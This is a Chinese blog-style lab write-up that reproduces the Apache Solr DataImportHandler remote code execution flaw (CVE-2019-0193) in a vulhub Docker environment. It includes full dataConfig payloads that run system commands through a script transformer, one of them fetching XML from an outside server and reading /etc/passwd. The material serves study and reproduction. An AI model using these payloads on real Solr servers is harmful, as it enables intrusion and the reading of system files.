ailx10说：这篇是我2024年10月写的。这篇 Solr 我折腾得比较久。网上常见的 feed 示例在我的环境里没成功，我后来自己部署了一份 XML，让转换器能够匹配到实际的数据行，再看 JavaScript 如何被触发、怎样把结果放回字段里。跑通以后又继续试连接，但最想留下的还是前面那段调整：没有输入行，转换函数可能根本没机会运行。这里不能把原示例为什么失败说得太满，不过自己搭一份可控数据，确实让我更清楚代码和数据分别在这条链里做什么。

编辑核查提示：原始数据源尝试失败，后来更换包含匹配 item 的 XML 后观察到结果；失败的根因没有独立验证。 原题代码和外部地址未重新运行；截图细字及水印仍待核对。

本文记录 Solr DataImportHandler 的历史实验。原文第一次尝试未成功，随后改用包含匹配 item 的自托管 XML 数据源，记录了不同结果；具体失败原因仍待验证。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

需要额外操作一步：

```
docker compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db  -force
```

简单访问一下，说明 Apache Solr 远程命令执行漏洞（CVE-2019-0193）环境搭建成功了

![](/notes-assets/c8fd88d12ab59d8d1fbe.webp)

（1）点击test核心，开启debug模式，粘贴下面的配置，最后执行，不知道为啥没有成功

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/ailx10");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

![](/notes-assets/cf9f17b4a934eb465655.webp)

（2）在自己的服务器上部署`http://144.34.162.13:8080/poc.xml` 内容如下

```
<?xml version="1.0" encoding="UTF-8"?>
<RDF>
<item/>
</RDF>
```

再次发送载荷，这次成功执行了`cat /etc/passwd`，在响应中回显了内容，Burp抓包如下：

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(row){ 
            var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cat /etc/passwd").getInputStream()));
            var result = [];
            while(true) {
              var oneline = bufReader.readLine();
              result.push( oneline );
              if(!oneline) break; 
            }
            row.put("title",result.join("
\r")); 
            return row;
          }
  ]]></script>
  <document>
    <entity name="whatever"
            url="http://144.34.162.13:8080/poc.xml"
            processor="XPathEntityProcessor"
            forEach="/RDF/item"
            transformer="script:poc" />
  </document>
</dataConfig>
```
